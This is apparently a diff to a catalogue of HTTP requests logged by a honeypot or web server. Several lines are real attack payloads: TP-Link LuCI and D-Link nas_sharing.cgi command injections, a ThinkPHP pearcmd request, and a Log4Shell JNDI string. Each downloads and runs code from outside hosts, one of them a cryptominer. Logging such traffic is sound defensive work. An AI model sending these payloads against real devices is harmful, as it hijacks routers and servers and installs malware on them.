@@ -360,11 +360,16 @@ method GET url /cgi-bin/luci
 method GET url /cgi-bin/luci/admin
 method GET url /cgi-bin/config.exp
 method GET url /cgi-bin/authLogin.cgi
+method GET url /cgi-bin/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0=
+method GET url /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0=
 method GET url /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWxvbAl8CXdnZXQJLU8tCWh0dHA6Ly85NC4xNTYuOC4yNDQvbG9sfHNo
+method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.163.214.97/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)
+method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://179.43.190.218/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F185.224.128.34%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk)
+method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.14.226.142%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
 method GET url /remote/login
 method GET url /showLogin.cc
 method GET url /WebInterface/
@@ -410,8 +415,11 @@ method GET url /db/dbadmin/index.php?lang=en
 method GET url /db/db-admin/index.php?lang=en
 method GET url /db/webadmin/index.php?lang=en
 method GET url /download/powershell/
+method GET url /js/NewWindow_2_all.js
 method GET url /actuator/gateway/routes
 method GET url /.well-known/security.txt
+method GET url /jquery-3.3.1.slim.min.js
+method GET url /jquery-3.3.2.slim.min.js
 method GET url /nmaplowercheck1705222954
 method GET url /nmaplowercheck1711560081
 method GET url /shopdb/index.php?lang=en
@@ -442,6 +450,7 @@ method GET url /dns-query?name=dnsscan.shadowserver.org&type=A
 method GET url /boaform/admin/formLogin?username=admin&psd=admin
 method GET url /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 method GET url /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
+method GET url /.most/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cHMJfAlncmVwCW15ZGxpbms=
 method GET url /s/3333e2530313e2232313e21393/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
 method GET url /index.php?lang=../../../../../../../../tmp/index1
 method GET url /index.php?lang=../../../../../../../../var/tmp/index1
@@ -451,6 +460,7 @@ method GET url /index.php?s=/index/\think\app/invokefunction&function=call_user_
 method GET url /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=curl%20http%3a%2f%2f94.156.79.60%2fgi.sh%20%7c%20sh%20%7c%7c%20wget%20-O-%20http%3a%2f%2f94.156.79.60%2fgi.sh%20%7c%20sh%20
 method GET url /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=curl%20http%3A%2F%2F193.222.96.163%2Fki.sh%20%7C%20sh%20-s%20thinkphp%20%7C%7C%20wget%20-O-%20http%3A%2F%2F193.222.96.163%2Fki.sh%20%7C%20sh%20-s%20thinkphp
 method GET url /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
+method GET url /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//95.214.55.202:3306/TomcatBypass/Command/Base64/a2lsbGFsbCAtOSBwYXJhaXNvLng4Njsga2lsbGFsbCAtOSB4bXJpZzsgY3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuYzNwb29sLm9yZy94bXJpZ19zZXR1cC9yYXcvbWFzdGVyL3NldHVwX2MzcG9vbF9taW5lci5zaCB8IExDX0FMTD1lbl9VUy5VVEYtOCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO%7D%27%29
 method GET url http://azenv.net/
 method GET url http://httpbin.org/ip
 method GET url http://www.google.com
@@ -516,6 +526,7 @@ method PRI url *
 method POST url /
 method POST url /app
 method POST url /sdk
+method POST url /login
 method POST url /.env
 method POST url /.env.old
 method POST url /.env.dist
@@ -610,6 +621,7 @@ method CONNECT url rev.pm:443
 method CONNECT url api.rev.pm:443
 method CONNECT url github.com:443
 method CONNECT url v4.ident.me:443
+method CONNECT url zaloweb.ink:443
 method CONNECT url google.com:443
 method CONNECT url www.google.com:80
 method CONNECT url www.google.com:443
@@ -628,5 +640,6 @@ method CONNECT url fingerprints.bablosoft.com:443
 method OPTIONS url /
 method OPTIONS url sip:nm
 method SSTP_DUPLEX_POST url /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/
+
 
 
